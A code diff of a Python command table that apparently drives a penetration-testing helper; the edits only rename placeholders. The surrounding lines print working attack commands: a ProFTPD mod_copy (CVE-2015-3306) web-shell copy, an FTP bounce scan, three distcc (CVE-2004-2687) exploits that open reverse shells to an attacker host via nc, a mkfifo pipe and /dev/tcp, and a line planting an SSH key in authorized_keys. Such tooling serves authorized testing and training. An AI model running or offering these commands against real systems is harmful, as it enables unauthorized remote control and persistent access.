@@ -4259,7 +4259,7 @@ _STEP_COMMANDS = {
             "# ProFTPD mod_copy CVE-2015-3306 (no auth): SITE CPFR /path/to/shell.php ; SITE CPTO /var/www/html/shell.php",
         ],
         6: [
-            "nmap -Pn -b anonymous:anonymous@<RHOST> <TARGET-INTERNAL-IP>",
+            "nmap -Pn -b anonymous:anonymous@<RHOST> <TARGET-INTERNAL>",
         ],
         7: [
             "# HackTricks FTP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp",
@@ -4363,7 +4363,7 @@ _STEP_COMMANDS = {
             "nmap -p3632 --script distcc-cve2004-2687 --script-args \"distcc-cve2004-2687.cmd=nc <LHOST> <LPORT> -e /bin/sh\" <RHOST>",
             "nmap -p3632 --script distcc-cve2004-2687 --script-args \"distcc-cve2004-2687.cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f\" <RHOST>",
             "nmap -p3632 --script distcc-cve2004-2687 --script-args \"distcc-cve2004-2687.cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\" <RHOST>",
-            "# most reliable: use the msf shell from step 2, or drop your SSH key via cmd=mkdir -p ~/.ssh && echo '<YOUR_PUBKEY>' >> ~/.ssh/authorized_keys",
+            "# most reliable: use the msf shell from step 2, or drop your SSH key via cmd=mkdir -p ~/.ssh && echo '<YOUR-PUBKEY>' >> ~/.ssh/authorized_keys",
         ],
         4: [
             "# HackTricks distcc: https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc",
